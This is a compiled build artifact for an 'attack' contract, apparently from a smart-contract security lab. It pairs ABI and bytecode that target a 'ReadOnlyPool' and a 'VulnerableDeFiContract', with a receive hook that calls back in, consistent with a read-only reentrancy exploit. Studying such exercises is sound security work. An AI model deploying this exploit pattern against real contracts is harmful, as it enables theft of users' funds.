{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract ReadOnlyPool",
          "name": "_pool",
          "type": "address"
        },
        {
          "internalType": "contract VulnerableDeFiContract",
          "name": "_defi",
          "type": "address"
        }
      ],
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x60806040526040516102573803806102578339810160408190526100229161006b565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100a5565b6001600160a01b038116811461006857600080fd5b50565b6000806040838503121561007e57600080fd5b825161008981610053565b602084015190925061009a81610053565b809150509250929050565b6101a3806100b46000396000f3fe6080604052600436106100225760003560e01c80639e5faafc1461009257600080fd5b3661008d57600160009054906101000a90046001600160a01b03166001600160a01b031663fb76f7086040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561007757600080fd5b505af115801561008b573d6000803e3d6000fd5b005b600080fd5b34801561009e57600080fd5b5061008b60008054906101000a90046001600160a01b03166001600160a01b031663e8078d94671bc16d674ec800006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156100f857600080fd5b505af115801561010c573d6000803e3d6000fd5b505060008054604080516333dcd14360e11b815290516001600160a01b0390921695506367b9a2869450600480820194509082900301818387803b15801561015357600080fd5b505af1158015610167573d6000803e3d6000fd5b5050505056fea2646970667358221220cd37eea72e4784cee5412111def0ab18c60abfe0c1f505c81dcd85ce2d12b98264736f6c634300080f0033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "attack()": "9e5faafc"
  },
  "id": 28
}